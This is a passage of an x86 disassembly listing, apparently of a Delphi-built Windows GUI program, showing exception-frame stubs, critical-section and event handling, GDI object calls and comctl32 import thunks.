jmp sub_4039ec
sub_41d722
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d7a9
jmp sub_403738
sub_41d7d6
jmp sub_4039ec
sub_41d7dd
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d7e8
push ecx
mov edx esp
mov ecx 0x4
call sub_41bfac
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41ba6c
sub_41d8f5
jmp sub_4039ec
sub_41d8fc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d9db
jmp sub_4039ec
sub_41d9e2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41da38
jmp sub_4039ec
sub_41da3f
pop ebx
pop ecx
pop ebp
retn
sub_41dc87
jmp sub_4039ec
sub_41dc8e
pop ecx
pop ecx
pop ebp
retn
sub_41dcd1
jmp sub_4039ec
sub_41dcd8
pop ebx
pop ecx
pop ebp
retn
sub_41dd74
jmp sub_4039ec
sub_41dd7b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41de29
jmp sub_4039ec
sub_41de30
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41de3c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e097
jmp sub_4039ec
sub_41e09e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0c3
mov eax [ ebp - 0x8 ]
call sub_403270
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_41e0bc
jmp sub_4039ec
sub_41e0c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0e8
lea eax [ ebp - 0x1c ]
call sub_4058a8
lea eax [ ebp - 0x18 ]
call sub_403fe8
retn
sub_41e0e1
jmp sub_4039ec
sub_41e0e8
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2fa
jmp sub_4039ec
sub_41e301
pop ebx
mov esp ebp
pop ebp
retn
sub_41e334
mov eax [ eax + 0x30 ]
call sub_4183f4
retn
sub_41e3a4
call sub_41e4d4
retn
sub_41e3e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b43c
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e4c3
jmp sub_4039ec
sub_41e4ca
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e4d4
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41abcc
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e4ec
test dl dl
je r-xdata
mov dl 0x8
call sub_420620
retn
mov dl 0x9
call sub_420620
retn
sub_41e543
jmp sub_4039ec
sub_41e54a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e5e2
jmp sub_4039ec
sub_41e5e9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e787
jmp sub_4039ec
sub_41e78e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eacf
jmp sub_4039ec
sub_41eb11
jmp sub_4039ec
sub_41eb70
jmp sub_4039ec
sub_41eb77
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41edb4
mov dl 0x1
call sub_420620
retn
sub_41edbc
xor edx edx
call sub_420620
retn
sub_41eeb5
jmp sub_4039ec
sub_41f08b
jmp sub_4039ec
sub_41f092
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f260
jmp sub_4039ec
sub_41f267
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f33d
jmp sub_4039ec
sub_41f344
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f45b
jmp sub_4039ec
sub_41f462
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f61c
jmp sub_4039ec
sub_41f623
pop ecx
pop ebp
retn
sub_41f6ae
jmp sub_4039ec
sub_41f6b5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f71c
jmp sub_4039ec
sub_41f723
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f7a1
jmp sub_4039ec
sub_41f7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7c5
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41f7be
jmp sub_4039ec
sub_41f7c5
pop ebx
pop ecx
pop ebp
retn
sub_41f880
jmp sub_4039ec
sub_41f887
pop ebx
pop ecx
pop ebp
retn
sub_41f95d
jmp sub_4039ec
sub_41f964
pop ecx
pop ebp
retn
sub_41f968
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41fa6f
jmp sub_4039ec
sub_41fa76
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fc1d
jmp sub_4039ec
sub_41fc9c
jmp sub_4039ec
sub_41fca3
mov esp ebp
pop ebp
retn
sub_41fd71
jmp sub_4039ec
sub_41fd78
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe2b
jmp sub_4039ec
sub_41fe32
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe91
jmp sub_4039ec
sub_41fe98
mov esp ebp
pop ebp
retn
sub_4202fd
jmp sub_4039ec
sub_420357
jmp sub_4039ec
sub_420368
jmp sub_403738
sub_4203c4
jmp sub_4039ec
sub_4203cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42042a
jmp sub_4039ec
sub_420431
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42055d
jmp sub_4039ec
sub_420564
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420612
jmp sub_4039ec
sub_420619
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420658
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ca34
sub_42068c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_4206a4
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_4206b0
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_4206a4
sub_4207d6
jmp sub_403738
sub_420805
jmp sub_4039ec
sub_42083b
jmp sub_4039ec
sub_420842
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420861
push rw-data
call LeaveCriticalSection
retn
sub_42085a
jmp sub_4039ec
sub_420861
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420930
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_420b0c
sub_420990
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41caf8
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4209a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41caf8
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4209b8
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41ece8
retn
sub_4209c4
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41ece8
retn
sub_420c6c
xor eax eax
retn
sub_420c70
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420c78
xor eax eax
retn
sub_420c7c
retn
sub_420c80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40403c
pop esi
pop ebx
retn
sub_420c94
mov eax [ eax + 0x4 ]
retn
sub_420c98
retn
sub_420c9c
xor eax eax
retn
sub_420ca0
retn
sub_420ca4
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420cb0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420cbc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420cc8
retn
sub_420ccc
xchg edx eax
call sub_41c79c
retn
sub_420cd4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_420d5c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40346c
pop esi
retn
sub_420d70
retn
sub_420e50
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
sub_420e90
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420fdc
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034a0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_420ff4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42107c
retn
sub_4210c4
retn
sub_4210fc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421114
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421338
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40346c
pop esi
pop ebx
retn
sub_42115c
mov al 0x1
retn
sub_421160
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421168
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421210
xor eax eax
retn
sub_421214
retn
sub_421240
retn
sub_4212d8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4212ec
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4183f4
retn
sub_421433
jmp sub_403738
sub_421438
mov ebx 0x1
call sub_403aa0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42149b
jmp sub_403738
sub_4214a0
mov ebx 0x80030103
call sub_403aa0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42151e
jmp sub_403738
sub_421523
mov ebx 0x80030009
call sub_403aa0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421581
jmp sub_403738
sub_421586
mov ebx 0x8000ffff
call sub_403aa0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421751
jmp sub_4039ec
sub_421762
jmp sub_403738
sub_421767
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421790
lea eax [ ebp + 0xc ]
call sub_4058a8
retn
sub_421789
jmp sub_4039ec
sub_421790
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_42179c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4217a8
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_4217b4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4217c0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42182f
jmp sub_403738
sub_421834
mov esi 0x8000ffff
call sub_403aa0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421848
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_4218b5
jmp sub_4039ec
sub_4218bc
mov eax [ rw-data ]
call sub_403270
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4218cc
call sub_417b38
retn
sub_421994
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_421b38
jmp sub_4039ec
sub_421b3f
pop ebp
retn
sub_421bcd
jmp sub_4039ec
sub_421bd4
pop ebp
retn
sub_421ec5
jmp sub_4039ec
sub_421ecc
pop ebp
retn
sub_421ed0
sub [ rw-data ] 0x1
retn
sub_42276b
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_422b88
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422bfc
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422c70
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422c7c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422d5c
jmp sub_4039ec
sub_422d63
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422df3
jmp sub_4039ec
sub_422e85
jmp sub_4039ec
sub_422e8c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422ef0
jmp sub_4039ec
sub_422ef7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422f5f
jmp sub_4039ec
sub_422f66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423009
jmp sub_4039ec
sub_423010
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423468
push 0x33
mov ecx rw-data
call sub_417e74
retn
sub_423478
push 0x33
mov ecx rw-data
call sub_417e34
retn
sub_423488
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4234ac
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423680
push 0x11
mov ecx rw-data
call sub_417e34
retn
sub_4237c0
push ebx
mov ebx eax
mov eax ebx
call sub_423488
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42387a
jmp sub_4039ec
sub_423881
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_423897
jmp sub_4039ec
sub_4238b0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42390d
jmp sub_4039ec
sub_423914
pop ebx
pop ecx
pop ebp
retn
sub_423a8d
jmp sub_4039ec
sub_423ab5
jmp sub_4039ec
sub_423abc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_423b28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40424c
pop esi
pop ebx
retn
sub_423b9c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423af8
push eax
call MulDiv
neg eax
pop ebx
retn
sub_423bd8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_423c10
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_423c40
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_423d5e
jmp sub_4039ec
sub_423d65
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_423d7b
jmp sub_4039ec
sub_423df1
jmp sub_4039ec
sub_423df8
pop ebx
pop ecx
pop ebp
retn
sub_423dfc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423eb2
jmp sub_4039ec
sub_423ed8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423f08
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424017
jmp sub_4039ec
sub_42401e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4234ac
retn
sub_424034
jmp sub_4039ec
sub_4240ad
jmp sub_4039ec
sub_4240b4
pop ebx
pop ecx
pop ebp
retn
sub_4241e5
jmp sub_4039ec
sub_4241f8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4245b3
jmp sub_4039ec
sub_4245ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245dc
mov eax [ ebp - 0x8 ]
call sub_4277e0
call sub_424a18
retn
sub_4245d5
jmp sub_4039ec
sub_4245dc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a18
retn
sub_4245fa
jmp sub_4039ec
sub_42482c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_424a08
jmp sub_4039ec
sub_424a0f
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424a18
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_424a50
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424a5c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424b9c
retn
sub_424c65
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_424c7c
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424d68
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424d88
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424da8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424dc8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
pop ebx
retn
sub_424de0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
pop ebx
retn
sub_424e04
mov eax [ rw-data ]
call sub_424de0
retn
sub_424e5a
jmp sub_4039ec
sub_424e61
pop ecx
pop ebp
retn
sub_424f00
jmp sub_4039ec
sub_424f07
pop ebx
mov esp ebp
pop ebp
retn
sub_424fd9
jmp sub_4039ec
sub_42506a
jmp sub_4039ec
sub_425071
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42509c
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_425183
jmp sub_4039ec
sub_425330
jmp sub_4039ec
sub_425337
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425549
jmp sub_4039ec
sub_425550
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_4255ea
jmp sub_4039ec
sub_4257c6
jmp sub_4039ec
sub_425880
jmp sub_4039ec
sub_425887
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258a7
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4258a0
jmp sub_4039ec
sub_4258a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_425a35
jmp sub_4039ec
sub_425c00
jmp sub_4039ec
sub_425c07
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c2a
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402714
retn
sub_425c23
jmp sub_4039ec
sub_425c2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c4a
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
sub_425c43
jmp sub_4039ec
sub_425c4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_425d9c
push 0x0
call sub_425d38
retn
sub_425e41
jmp sub_4039ec
sub_425e48
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425e54
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425da4
pop ebx
pop ebp
retn 0x4
sub_425e68
retn
sub_425e6c
test eax eax
jne r-xdata
retn
call sub_425e68
sub_42603f
jmp sub_4039ec
sub_426066
jmp sub_4039ec
sub_42606d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4260ac
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426279
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_426282
jmp sub_4039ec
j_sub_426279
jmp sub_426279
sub_426289
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_42629f
jmp sub_4039ec
sub_4262b0
xor eax eax
retn
sub_4262b4
mov al [ eax + 0x21 ]
retn
sub_426300
jmp sub_4039ec
sub_426307
pop esi
pop ecx
pop ebp
retn
sub_426334
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42638b
jmp sub_4039ec
sub_426392
pop esi
pop ecx
pop ebp
retn
sub_426398
retn
sub_42639c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4263ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_4264ca
jmp sub_4039ec
sub_4264f2
jmp sub_4039ec
sub_4264f9
mov esp ebp
pop ebp
retn
sub_426570
jmp sub_4039ec
sub_426678
jmp sub_4039ec
sub_426763
jmp sub_4039ec
sub_426770
inc [ eax + 0x4 ]
retn
sub_4268eb
jmp sub_4039ec
sub_426c9c
jmp sub_4039ec
sub_426ee6
jmp sub_4039ec
sub_426f10
jmp sub_4039ec
sub_426f17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f39
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_426f32
jmp sub_4039ec
sub_426f43
jmp sub_403738
sub_426f92
jmp sub_4039ec
sub_4271bf
jmp sub_4039ec
sub_427207
jmp sub_4039ec
sub_427374
jmp sub_4039ec
sub_42743b
jmp sub_403738
sub_427490
mov [ eax + 0x31 ] 0x0
call sub_4260ac
retn
sub_4276e1
jmp sub_4039ec
sub_42774c
jmp sub_4039ec
sub_427753
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4277c4
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_427878
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_427888
push ebx
mov ebx eax
mov eax ebx
call sub_427b20
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42789c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4278b8
push ebx
mov ebx eax
mov eax ebx
call sub_427b80
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_427914
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_427a23
jmp sub_4039ec
sub_427aea
jmp sub_403738
sub_427d67
jmp sub_403738
sub_427dc7
jmp sub_4039ec
sub_427dce
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4281af
jmp sub_4039ec
sub_4281db
jmp sub_4039ec
sub_428242
jmp sub_403738
sub_428273
jmp sub_4039ec
sub_4282f8
jmp sub_403738
sub_4282fd
mov eax [ ebp - 0x38 ]
call sub_403270
call sub_403a4c
call sub_403aa0
sub_42830f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42832c
mov eax [ ebp - 0x18 ]
call sub_402714
retn
sub_428325
jmp sub_4039ec
sub_42847b
jmp sub_403738
sub_428747
jmp sub_403738
sub_4287d8
mov cl 0x1
call sub_4287e0
retn
sub_428a95
add [ eax ] al
add [ ebx ] dh
leave
call sub_4287e0
retn
sub_428b1a
jmp sub_403738
sub_428b1f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a4c
call sub_403aa0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428b70
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_428ca9
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_428cd8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_428cec
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_428e05
jmp sub_403738
sub_428eba
jmp sub_403738
sub_428f24
jmp sub_403738
sub_428f58
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_428ee4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_428f70
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424dc8
retn
mov [ eax + 0x30 ] edx
retn
sub_428f88
retn
sub_428f8c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424dc8
retn
mov [ eax + 0x2c ] edx
retn
sub_428fcc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424dc8
pop ebp
retn 0x4
sub_428fe0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424dc8
pop ebp
retn 0x4
sub_4291a0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4291ac
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_429259
jmp sub_4039ec
sub_429260
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42934b
jmp sub_403738
sub_4293b7
jmp sub_4039ec
sub_4294e5
jmp sub_4039ec
sub_4294ec
pop ebp
retn
sub_4295ec
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_429621
jmp sub_4039ec
sub_429628
pop ebp
retn
sub_42962c
sub [ rw-data ] 0x1
retn
sub_429874
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418550
retn
sub_4298a8
mov eax [ eax + 0x4 ]
call sub_4183f4
retn
sub_4298d9
jmp sub_4039ec
sub_4298e0
pop ebp
retn
sub_4298e4
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_14(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
